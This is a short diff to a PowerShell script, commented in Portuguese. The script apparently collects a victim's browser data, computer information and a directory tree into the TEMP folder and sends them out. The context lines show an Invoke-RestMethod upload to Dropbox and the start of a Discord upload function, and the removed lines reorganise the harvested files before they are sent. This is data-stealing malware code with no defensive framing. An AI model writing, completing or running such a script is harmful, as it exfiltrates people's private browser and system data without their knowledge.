@@ -549,17 +549,6 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
-#Organização de Ficheiros
-# Criar as pastas necessárias dentro da pasta temporária
-New-Item -Path "$env:TEMP\$FolderName\Dados do Browser" -ItemType Directory
-New-Item -Path "$env:TEMP\$FolderName\Dados do Computador" -ItemType Directory
-New-Item -Path "$env:TEMP\$FolderName\Tree" -ItemType Directory
-
-# Mover os arquivos para as pastas corretas
-Move-Item -Path "$env:TEMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados do Browser"
-Move-Item -Path "$env:TEMP\$FolderName\computerData.txt" -Destination "$env:TEMP\$FolderName\Dados do Computador"
-Move-Item -Path "$env:TEMP\$FolderName\tree.txt" -Destination "$env:TEMP\$FolderName\Tree"
-############################################################################################################################################################
 #Upload para o Discord
 function Upload-Discord {
 
